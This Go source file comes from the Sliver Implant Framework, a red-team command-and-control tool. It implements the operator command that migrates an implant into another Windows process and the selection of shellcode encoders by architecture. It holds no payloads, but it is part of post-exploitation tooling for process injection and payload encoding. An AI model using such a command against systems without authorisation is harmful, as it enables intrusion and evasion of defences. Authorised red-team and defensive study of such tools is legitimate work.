package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"errors"
	"fmt"
	"sort"
	"strings"

	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/client/console"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/forms"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
)

// MigrateCmd - Windows only, inject an implant into another process
func MigrateCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	pid, _ := cmd.Flags().GetUint32("pid")
	procName, _ := cmd.Flags().GetString("process-name")
	if pid == 0 && procName == "" {
		con.PrintErrorf("Error: Must specify either a PID or process name\n")
		return
	}

	var config *clientpb.ImplantConfig
	var implantName string

	if session != nil {
		config = con.GetActiveSessionConfig()
		implantName = session.Name
	} else {
		config = con.GetActiveBeaconConfig()
		implantName = beacon.Name
	}

	targetArch := config.GetGOARCH()
	if session != nil && session.Arch != "" {
		targetArch = session.Arch
	} else if beacon != nil && beacon.Arch != "" {
		targetArch = beacon.Arch
	}

	encoder, err := parseShellcodeEncoderFlag(cmd, targetArch, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	ctrl := make(chan bool)
	if pid != 0 {
		con.SpinUntil(fmt.Sprintf("Migrating into %d ...", pid), ctrl)
	} else {
		con.SpinUntil(fmt.Sprintf("Migrating into %s...", procName), ctrl)
	}

	/* If the HTTP C2 Config name is not defined, then put in the default value
	   This will have no effect on implants that do not use HTTP C2
	   Also this should be overridden when the build info is pulled from the
	   database, but if there is no build info and we have to create the build
	   from scratch, we need to have something in here.
	*/
	if config.HTTPC2ConfigName == "" {
		config.HTTPC2ConfigName = consts.DefaultC2Profile
	}

	migrate, err := con.Rpc.Migrate(context.Background(), &clientpb.MigrateReq{
		Pid:      pid,
		Config:   config,
		Request:  con.ActiveTarget.Request(cmd),
		Encoder:  encoder,
		Name:     implantName,
		ProcName: procName,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}
	if migrate.Response != nil && migrate.Response.Async {
		con.AddBeaconCallback(migrate.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, migrate)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
			}
			if !migrate.Success {
				if migrate.GetResponse().GetErr() != "" {
					con.PrintErrorf("%s\n", migrate.GetResponse().GetErr())
				} else {
					con.PrintErrorf("Could not migrate into a new process. Check the PID or name.")
				}
				return
			}
			con.PrintInfof("Successfully migrated to %d\n", migrate.Pid)
		})
		con.PrintAsyncResponse(migrate.Response)
	} else {
		if !migrate.Success {
			if migrate.GetResponse().GetErr() != "" {
				con.PrintErrorf("%s\n", migrate.GetResponse().GetErr())
			} else {
				con.PrintErrorf("Could not migrate into a new process. Check the PID or name.")
			}
			return
		}
		con.PrintInfof("Successfully migrated to %d\n", migrate.Pid)
	}
}

func normalizeShellcodeEncoderName(name string) string {
	normalized := strings.ToLower(strings.TrimSpace(name))
	normalized = strings.ReplaceAll(normalized, "-", "_")
	return normalized
}

func normalizeShellcodeArch(arch string) string {
	normalized := strings.ToLower(strings.TrimSpace(arch))
	switch normalized {
	case "amd64", "x64", "x86_64":
		return "amd64"
	case "386", "x86", "i386":
		return "386"
	case "arm64", "aarch64":
		return "arm64"
	default:
		return normalized
	}
}

func fetchShellcodeEncoderMap(con *console.SliverClient) (*clientpb.ShellcodeEncoderMap, error) {
	if con == nil || con.Rpc == nil {
		return nil, errors.New("no RPC client")
	}
	grpcCtx, cancel := con.GrpcContext(nil)
	defer cancel()
	return con.Rpc.ShellcodeEncoderMap(grpcCtx, &commonpb.Empty{})
}

func compatibleShellcodeEncoderNames(encoderMap *clientpb.ShellcodeEncoderMap, arch string) []string {
	if encoderMap == nil {
		return nil
	}
	arch = normalizeShellcodeArch(arch)
	archMap := encoderMap.GetEncoders()[arch]
	if archMap == nil {
		return nil
	}

	names := make([]string, 0, len(archMap.GetEncoders()))
	for name := range archMap.GetEncoders() {
		names = append(names, name)
	}
	sort.Strings(names)
	return names
}

func shellcodeEncoderEnumForArch(encoderMap *clientpb.ShellcodeEncoderMap, arch, name string) (clientpb.ShellcodeEncoder, bool) {
	if encoderMap == nil {
		return clientpb.ShellcodeEncoder_NONE, false
	}
	arch = normalizeShellcodeArch(arch)
	name = normalizeShellcodeEncoderName(name)
	archMap := encoderMap.GetEncoders()[arch]
	if archMap == nil {
		return clientpb.ShellcodeEncoder_NONE, false
	}
	encoder, ok := archMap.GetEncoders()[name]
	return encoder, ok
}

func parseShellcodeEncoderFlag(cmd *cobra.Command, targetArch string, con *console.SliverClient) (clientpb.ShellcodeEncoder, error) {
	rawEncoder, _ := cmd.Flags().GetString("shellcode-encoder")
	rawEncoder = strings.TrimSpace(rawEncoder)

	if cmd.Flags().Changed("shellcode-encoder") && rawEncoder == "" {
		return clientpb.ShellcodeEncoder_NONE, fmt.Errorf("shellcode-encoder cannot be empty; use 'none' to disable encoding")
	}

	normalized := normalizeShellcodeEncoderName(rawEncoder)
	if normalized == "none" {
		return clientpb.ShellcodeEncoder_NONE, nil
	}

	encoderMap, err := fetchShellcodeEncoderMap(con)
	if err != nil {
		return clientpb.ShellcodeEncoder_NONE, err
	}

	// If no encoder specified, prompt for a compatible encoder (or none).
	if rawEncoder == "" && !cmd.Flags().Changed("shellcode-encoder") {
		compatible := compatibleShellcodeEncoderNames(encoderMap, targetArch)
		if len(compatible) == 0 {
			// No known compatible encoders for this arch.
			return clientpb.ShellcodeEncoder_NONE, nil
		}

		options := append([]string{"none"}, compatible...)
		choice := "none"
		if err := forms.Select("Select a shellcode encoder (optional)", options, &choice); err != nil {
			return clientpb.ShellcodeEncoder_NONE, err
		}
		if normalizeShellcodeEncoderName(choice) == "none" {
			return clientpb.ShellcodeEncoder_NONE, nil
		}

		encoder, ok := shellcodeEncoderEnumForArch(encoderMap, targetArch, choice)
		if !ok {
			return clientpb.ShellcodeEncoder_NONE, fmt.Errorf("unsupported shellcode encoder %q for arch %s", choice, normalizeShellcodeArch(targetArch))
		}
		return encoder, nil
	}

	// Encoder explicitly specified by name.
	encoder, ok := shellcodeEncoderEnumForArch(encoderMap, targetArch, rawEncoder)
	if !ok {
		compatible := compatibleShellcodeEncoderNames(encoderMap, targetArch)
		if len(compatible) == 0 {
			return clientpb.ShellcodeEncoder_NONE, fmt.Errorf("no shellcode encoders are available for arch %s", normalizeShellcodeArch(targetArch))
		}
		return clientpb.ShellcodeEncoder_NONE, fmt.Errorf("unsupported shellcode encoder %q for arch %s (valid: %s)", rawEncoder, normalizeShellcodeArch(targetArch), strings.Join(compatible, ", "))
	}
	return encoder, nil
}
